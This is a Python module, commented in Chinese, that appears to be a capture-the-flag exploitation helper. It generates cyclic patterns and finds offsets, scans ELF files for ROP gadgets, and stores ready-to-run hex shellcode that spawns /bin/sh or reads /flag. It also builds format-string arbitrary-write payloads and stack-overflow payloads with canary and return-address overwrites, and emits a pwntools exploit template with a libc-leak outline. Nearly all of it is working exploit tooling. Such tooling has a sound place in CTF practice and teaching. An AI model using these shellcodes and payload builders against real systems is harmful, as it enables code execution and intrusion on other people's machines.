"""Pwn 辅助：循环模式偏移计算、gadget 扫描、shellcode、payload 构造、pwntools 脚本模板。"""

from __future__ import annotations

import struct

ALPHABET = "abcdefghijklmnopqrstuvwxyz"


def _de_bruijn(k: int, n: int) -> list[int]:
    a = [0] * (k * n)
    seq: list[int] = []

    def db(t: int, p: int) -> None:
        if t > n:
            if n % p == 0:
                seq.extend(a[1:p + 1])
        else:
            a[t] = a[t - p]
            db(t + 1, p)
            for j in range(a[t - p] + 1, k):
                a[t] = j
                db(t + 1, t)
    db(1, 1)
    return seq


def cyclic(length: int, alphabet: str = ALPHABET) -> bytes:
    """生成循环模式串（等价 pwntools cyclic）。"""
    if length <= 0:
        return b""
    k = len(alphabet)
    n = 4
    while k ** n < length:
        n += 1
    seq = _de_bruijn(k, n)
    out = bytes(ord(alphabet[i % k]) for i in seq)
    while len(out) < length:
        out += out
    return out[:length]


def cyclic_find(value, alphabet: str = ALPHABET) -> int:
    """在循环模式串里定位崩溃值，返回偏移（找不到返回 -1）。"""
    if isinstance(value, int):
        raw = struct.pack("<I", value) if value <= 0xFFFFFFFF else struct.pack("<Q", value)
    elif isinstance(value, str):
        clean = value.strip().replace("0x", "").replace(" ", "")
        try:
            raw = bytes.fromhex(clean.zfill(len(clean) + len(clean) % 2))
        except ValueError:
            raw = value.encode()
    else:
        raw = bytes(value)
    seq = cyclic(20000, alphabet)
    idx = seq.find(raw)
    if idx >= 0:
        return idx
    return seq.find(raw[:4])


GADGETS: list[tuple[bytes, str]] = [
    (b"\xc3", "ret"),
    (b"\x5f\xc3", "pop rdi ; ret"),
    (b"\x5e\xc3", "pop rsi ; ret"),
    (b"\x5a\xc3", "pop rdx ; ret"),
    (b"\x58\xc3", "pop rax ; ret"),
    (b"\x5d\xc3", "pop rbp ; ret"),
    (b"\x5b\xc3", "pop rbx ; ret"),
    (b"\x41\x5c\xc3", "pop r12 ; ret"),
    (b"\x59\xc3", "pop rcx ; ret"),
    (b"\xc9\xc3", "leave ; ret"),
    (b"\x0f\x05", "syscall"),
    (b"\x99\xc3", "cdq ; ret"),
    (b"\x48\x99\xc3", "cqo ; ret"),
    (b"\x31\xc0\xc3", "xor eax, eax ; ret"),
    (b"\x48\x31\xf6\xc3", "xor rsi, rsi ; ret"),
    (b"\x48\x31\xd2\xc3", "xor rdx, rdx ; ret"),
    (b"\x48\x31\xc0\xc3", "xor rax, rax ; ret"),
    (b"\xff\xe4", "jmp rsp"),
    (b"\xff\xd0", "call rax"),
    (b"/bin/sh\x00", "字符串 /bin/sh"),
]


def elf_offset_to_va(data: bytes) -> list[tuple[int, int, int]]:
    """返回 ELF 的 (文件偏移起, 虚拟地址起, 大小) 映射表。"""
    if data[:4] != b"\x7fELF":
        return []
    is64 = data[4] == 2
    endian = "<" if data[5] == 1 else ">"
    try:
        if is64:
            e_phoff = struct.unpack(endian + "Q", data[32:40])[0]
            e_phentsize, e_phnum = struct.unpack(endian + "HH", data[54:58])
        else:
            e_phoff = struct.unpack(endian + "I", data[28:32])[0]
            e_phentsize, e_phnum = struct.unpack(endian + "HH", data[42:46])
    except struct.error:
        return []
    out = []
    for i in range(min(e_phnum, 64)):
        off = e_phoff + i * e_phentsize
        try:
            if is64:
                p_type, _fl, p_offset, p_vaddr, _pa, p_filesz, _msz = struct.unpack(
                    endian + "IIQQQQQ", data[off:off + 56])
            else:
                p_type, p_offset, p_vaddr, _pa, p_filesz, _msz, _fl = struct.unpack(
                    endian + "IIIIIII", data[off:off + 32])
        except struct.error:
            continue
        if p_type == 1 and p_filesz:
            out.append((p_offset, p_vaddr, p_filesz))
    return out


def find_gadgets(data: bytes, limit_per_kind: int = 6) -> list[tuple[int, int | None, str]]:
    """扫描常见 gadget 字节模式，返回 [(文件偏移, 虚拟地址或 None, 说明)]。"""
    maps = elf_offset_to_va(data)

    def to_va(offset: int) -> int | None:
        for start, vaddr, size in maps:
            if start <= offset < start + size:
                return vaddr + (offset - start)
        return None

    out: list[tuple[int, int | None, str]] = []
    counts: dict[str, int] = {}
    for pattern, desc in GADGETS:
        start = 0
        while True:
            idx = data.find(pattern, start)
            if idx < 0:
                break
            start = idx + 1
            if counts.get(desc, 0) >= limit_per_kind:
                break
            counts[desc] = counts.get(desc, 0) + 1
            out.append((idx, to_va(idx), desc))
    out.sort(key=lambda x: (x[2], x[0]))
    return out


SHELLCODES = {
    "linux/x64 execve(/bin/sh)": "4831f65648bf2f62696e2f2f736857545f6a3b58990f05",
    "linux/x86 execve(/bin/sh)": "31c951682f2f7368682f62696e89e331c0505389e1b00bcd80",
    "linux/x64 读取 /flag（execve /bin/cat /flag）":
        "4831f648bb2f62696e2f63617400534889e757488d3d0b000000488d35080000004831d20f05",
}


def shellcode_bytes(name: str) -> bytes | None:
    hexs = SHELLCODES.get(name, "")
    if not hexs or not all(c in "0123456789abcdefABCDEF" for c in hexs):
        return None
    return bytes.fromhex(hexs)


def fmtstr_payload(offset: int, writes: dict[int, int], addr_size: int = 8,
                   max_bytes: int = 4) -> str:
    """简化版格式化字符串任意写（按 2 字节粒度）。

    offset: 格式化串在栈上的参数序号（例如 %6$p 的 6）
    writes: {目标地址: 要写入的值}
    """
    pairs: list[tuple[int, int]] = []
    for addr, value in sorted(writes.items()):
        for i in range(0, max_bytes, 2):
            chunk = (value >> (8 * i)) & 0xFFFF
            if chunk:
                pairs.append((addr + i, chunk))
    if not pairs:
        return "没有需要写入的数据"
    pairs.sort(key=lambda kv: kv[1])
    parts: list[str] = []
    previous = 0
    for i, (_addr, value) in enumerate(pairs):
        pad = value - previous
        if pad < 0:
            pad += 0x10000
        parts.append(f"%{pad}c%{offset + i}$hn")
        previous = value
    payload = "".join(parts).encode()
    while len(payload) % addr_size:
        payload += b"A"
    addr_bytes = b"".join(struct.pack("<Q" if addr_size == 8 else "<I", a) for a, _v in pairs)
    full = payload + addr_bytes
    lines = [f"payload 长度：{len(full)} 字节（地址从偏移 {len(payload)} 开始）",
             f"payload(hex)：{full.hex()}", "", "python（pwntools）：", "```python",
             "payload  = b''"]
    previous = 0
    for i, (_addr, value) in enumerate(pairs):
        pad = value - previous
        if pad < 0:
            pad += 0x10000
        lines.append(f"payload += f'%{pad}c%{offset + i}$hn'.encode()")
        previous = value
    lines.append(f"payload  = payload.ljust(0x{len(payload):x}, b'A')")
    for addr, _v in pairs:
        lines.append(f"payload += p{addr_size * 8}(0x{addr:x})")
    lines.append("```")
    return "\n".join(lines)


def build_payload(offset: int, ret_addr: int | None = None, filler: bytes = b"A",
                  canary: int | None = None, saved_rbp: bytes | None = None,
                  arch: int = 64, extra: bytes = b"") -> tuple[bytes, str]:
    """构造栈溢出 payload：填充 + (canary) + (saved rbp) + 返回地址 + 附加数据。"""
    packing = "<Q" if arch == 64 else "<I"
    payload = filler * offset
    desc = [f"填充 {offset} 字节（偏移 → 返回地址）"]
    if canary is not None:
        payload += struct.pack(packing, canary)
        desc.append(f"canary: 0x{canary:x}")
    if saved_rbp is not None:
        payload += saved_rbp
        desc.append("覆盖 saved rbp")
    if ret_addr is not None:
        payload += struct.pack(packing, ret_addr)
        desc.append(f"返回地址: 0x{ret_addr:x}")
    if extra:
        payload += extra
        desc.append(f"附加数据: {extra!r}")
    code = ["payload = %r * %d" % (filler, offset)]
    if canary is not None:
        code.append(f"payload += p{arch}(0x{canary:x})")
    if saved_rbp is not None:
        code.append(f"payload += {saved_rbp!r}")
    if ret_addr is not None:
        code.append(f"payload += p{arch}(0x{ret_addr:x})")
    if extra:
        code.append(f"payload += {extra!r}")
    lines = ["payload(hex):", payload.hex(), "", "python（pwntools）：", "```python"]
    lines += code + ["```"]
    summary = "\n".join(f"- {d}" for d in desc)
    return payload, summary + "\n\n" + "\n".join(lines)


def pwntools_template(binary: str, offset: int = 40, remote: str = "",
                      libc: str = "", ret_addr: int = 0) -> str:
    """生成开箱可改的 pwntools 脚本模板。"""
    host, port = "", ""
    if remote and ":" in remote:
        host, _, port = remote.partition(":")
    lines = [
        "from pwn import *",
        "",
        "context.log_level = 'debug'",
        "elf = ELF('./%s')" % binary,
    ]
    if libc:
        lines.append("libc = ELF('./%s')" % libc)
    if host:
        lines.append("io = remote('%s', %s)" % (host, port or "0"))
    else:
        lines.append("io = process('./%s')" % binary)
    lines += [
        "",
        "# 1) 先用 cyclic 找偏移：发 cyclic(200) 后用 cyclic_find(崩溃值)",
        "offset = %d" % offset,
        "",
        "# 2) 按题目填充地址（用二进制信息卡看 PIE/NX/Canary）",
        "# pop_rdi = 0x...",
        "# puts_plt = elf.plt['puts']",
        "# puts_got = elf.got['puts']",
        "# main     = elf.symbols['main']",
        "",
        "def exp():",
        "    payload  = b'A' * offset",
    ]
    if ret_addr:
        lines.append("    payload += p64(0x%x)" % ret_addr)
    else:
        lines.append("    payload += p64(0xDEADBEEF)   # TODO: 换成真实地址")
    lines += [
        "    io.sendlineafter(b'> ', payload)",
        "",
        "    # 泄漏 libc：puts(puts_got) 后回到 main",
        "    # libc.address = u64(io.recvline().strip().ljust(8, b'\\x00')) - libc.symbols['puts']",
        "    # system = libc.symbols['system']",
        "    # binsh  = next(libc.search(b'/bin/sh'))",
        "",
        "    io.interactive()",
        "",
        "",
        "if __name__ == '__main__':",
        "    exp()",
    ]
    return "\n".join(lines) + "\n"
